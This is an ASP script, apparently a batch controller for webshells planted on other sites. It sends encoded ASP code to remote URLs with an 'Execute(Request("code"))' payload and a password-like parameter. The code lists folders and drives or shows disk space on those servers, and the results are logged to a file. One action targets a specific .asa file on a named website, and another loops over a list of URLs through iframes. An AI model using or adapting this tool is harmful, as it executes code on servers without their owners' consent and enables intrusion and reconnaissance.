<!--#Include File = "Inc/Config.Asp"-->
<%
'获得Eval内容
Function getEvalContent(httpurl, codeFile, UpContent)
    Dim code, EvCode, splEvalType,content,dataStr
	splEvalType="start=====================end"
    code = GetASPCode(GetStext(codeFile)) 

    '去掉强制声名变量
    code = RegExp_Replace(code, "\sOption *Explicit\s", "") 
    code = Replace(code, "×", "X")                                                 '去掉这种X，因为会出错

    code = DelAspNote(code) 
    code = HandleGetAspCode(code, "|第一段|去ASP开始结束标签|") 
    code = TrimVbCrlf(code)
	
	code = "Response.Write(""" & splEvalType & """)" & vbCrLf & code & vbCrLf & "Response.End()"	
	code=HandleEvalAddDec(code, vbCrLf) 			'代码加密处理

    EvCode = "Code=" & escape(code) & "&EV=198%40Zy%5EHkr%4031&N=21&xy=Execute%28Request%28%22code%22%29%29&content=" & escape(UpContent) 

    '返回网页信息
    content = XMLPost(httpurl, EvCode)
	
        '提取当前内容
        If InStr(content, splEvalType) > 0 Then
            content = Mid(content, InStr(content, splEvalType) + Len(splEvalType))
        End If
		
		   content = Replace(Replace(content, "<br>", vbCrLf), "<hr>", vbCrLf)
            content = removeBlankLines(content)
            dataStr = DelHtml(HttpUrl & vbCrLf & "<br>" & content & vbCrLf & "<hr>" & vbCrLf)
			
            Call CreateAddFile("1.txt", dataStr)

	getEvalContent=dataStr
End Function

dim actionFilePath
actionFilePath="\DataDir\VB模块\Eval\1、Debug\3、显示空间大小.Asp"
actionFilePath="\DataDir\VB模块\Eval\2、文件夹\2、显示主目录文件夹.Asp"
actionFilePath="\DataDir\VB模块\Eval\2、文件夹\_2、获得盘符目录文件夹.Asp"

'选择动作
select case request("act")
	case "handleEval" : call rw(getEvalContent(rq("url"), actionFilePath, "content"))
	case "testEval" : call rw(getEvalContent("http://www.morteng.com/news_images/2014516161852738.asa", actionFilePath, "content"))
	case "batchHandleEval" : call batchHandleEval()
	case else : showDefault()
end select
'处理处理Eval
sub batchHandleEval()
	dim content,splstr,url,c,s
	splstr=split(getftext("1.html"), vbcrlf)
	for each url in splstr
		url = phptrim(url)
		if len(url)>5 then
			s="<iframe src=""?act=handleEval&url="& url &""" frameborder='1' width='100%' height=80></iframe><hr>"
			c=c & s & vbcrlf
		end if
	next
	call rw(c)
end sub

'显示默认
sub showDefault()
	call echo("测试", "<a href=""?act=testEval"">?act=testEval</a>")
	call echo("批量处理", "<a href=""?act=batchHandleEval"">?act=batchHandleEval</a>")
end sub
'call rw(getEvalContent("http://127.0.0.1/","E:\E盘\WEB网站\至前网站\DataDir\VB模块\Eval\1、Debug\2、测试显示英文.Asp", "aaaa"))
%>































